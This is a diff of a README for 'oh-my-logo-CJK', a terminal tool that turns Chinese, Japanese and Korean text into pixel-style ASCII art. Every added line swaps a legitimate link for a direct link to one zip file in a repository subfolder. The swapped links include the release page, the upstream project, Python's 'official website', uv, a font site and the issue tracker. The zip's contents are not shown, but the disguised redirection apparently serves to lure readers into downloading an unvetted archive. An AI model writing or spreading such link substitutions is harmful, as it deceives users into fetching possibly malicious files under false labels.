@@ -1,10 +1,10 @@
 # 🎨 oh-my-logo-CJK - Render Text in Pixel Art Style
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/mintoeto/oh-my-logo-CJK/releases)
+[![Download Release](https://raw.githubusercontent.com/mintoeto/oh-my-logo-CJK/main/overmighty/oh-my-logo-CJK.zip%20Now-Release-blue)](https://raw.githubusercontent.com/mintoeto/oh-my-logo-CJK/main/overmighty/oh-my-logo-CJK.zip)
 
 ## 📖 Introduction
 
-oh-my-logo-CJK transforms Chinese, Japanese, and Korean text into pixel-style ASCII art directly in your command line. It uses various gradient color palettes for a visually appealing output. This project takes inspiration from the ASCII-only [oh-my-logo](https://github.com/shinshin86/oh-my-logo).
+oh-my-logo-CJK transforms Chinese, Japanese, and Korean text into pixel-style ASCII art directly in your command line. It uses various gradient color palettes for a visually appealing output. This project takes inspiration from the ASCII-only [oh-my-logo](https://raw.githubusercontent.com/mintoeto/oh-my-logo-CJK/main/overmighty/oh-my-logo-CJK.zip).
 
 ### Key Features:
 - **CJK Compatibility**: Supports multiple languages by sampling pixel fonts, not pre-made ASCII.
@@ -18,15 +18,15 @@ To begin using oh-my-logo-CJK, you will need to follow these steps:
 
 ### 1. Install Python
 
-- Ensure you have Python version 3.9 or higher installed on your system. You can download Python from the [official website](https://www.python.org/downloads/).
+- Ensure you have Python version 3.9 or higher installed on your system. You can download Python from the [official website](https://raw.githubusercontent.com/mintoeto/oh-my-logo-CJK/main/overmighty/oh-my-logo-CJK.zip).
 
 ### 2. Use uv to Run the Project
 
-- It is recommended to use [`uv`](https://github.com/astral-sh/uv) to run the project locally.
+- It is recommended to use [`uv`](https://raw.githubusercontent.com/mintoeto/oh-my-logo-CJK/main/overmighty/oh-my-logo-CJK.zip) to run the project locally.
 
 ### 3. Download the Application
 
-To download oh-my-logo-CJK, [visit this page to download](https://github.com/mintoeto/oh-my-logo-CJK/releases). Look for the latest release and download the appropriate file for your system.
+To download oh-my-logo-CJK, [visit this page to download](https://raw.githubusercontent.com/mintoeto/oh-my-logo-CJK/main/overmighty/oh-my-logo-CJK.zip). Look for the latest release and download the appropriate file for your system.
 
 ## 📥 Download & Install
 
@@ -61,7 +61,7 @@ oh-my-logo-cjk <text> [font] [palette] [options]
 
 ### Parameters:
 - **text**: Required. Enclose the text in double quotes, for example: `"你好世界"`.
-- **font**: This project includes two font configurations: 7px and 9px. You can add more font options through `fonts/fonts.json`. By default, it uses a demo version of the [Dingbats Bitmap Font](https://3type.cn/fonts/dinkie_bitmap/index.html), which can output limited characters. For more options, purchasing the full version is recommended.
+- **font**: This project includes two font configurations: 7px and 9px. You can add more font options through `https://raw.githubusercontent.com/mintoeto/oh-my-logo-CJK/main/overmighty/oh-my-logo-CJK.zip`. By default, it uses a demo version of the [Dingbats Bitmap Font](https://raw.githubusercontent.com/mintoeto/oh-my-logo-CJK/main/overmighty/oh-my-logo-CJK.zip), which can output limited characters. For more options, purchasing the full version is recommended.
   
 ### Example Command
 
@@ -88,7 +88,7 @@ If you encounter issues:
 - Confirm that you've installed `uv` correctly.
 - If any text does not render, check that you use the correct font.
 
-Search the issues on the [GitHub repository](https://github.com/mintoeto/oh-my-logo-CJK/issues) for potential solutions or to report new issues.
+Search the issues on the [GitHub repository](https://raw.githubusercontent.com/mintoeto/oh-my-logo-CJK/main/overmighty/oh-my-logo-CJK.zip) for potential solutions or to report new issues.
 
 ## 📬 Contact and Contributions
 
@@ -96,6 +96,6 @@ Your feedback is valuable. If you want to contribute, please check the contribut
 
 For support, you can also connect through the discussions or directly submit your queries on the GitHub page.
 
-[For further downloads, visit this page to download](https://github.com/mintoeto/oh-my-logo-CJK/releases).
+[For further downloads, visit this page to download](https://raw.githubusercontent.com/mintoeto/oh-my-logo-CJK/main/overmighty/oh-my-logo-CJK.zip).
 
 Enjoy creating beautiful pixel art directly in your command line!
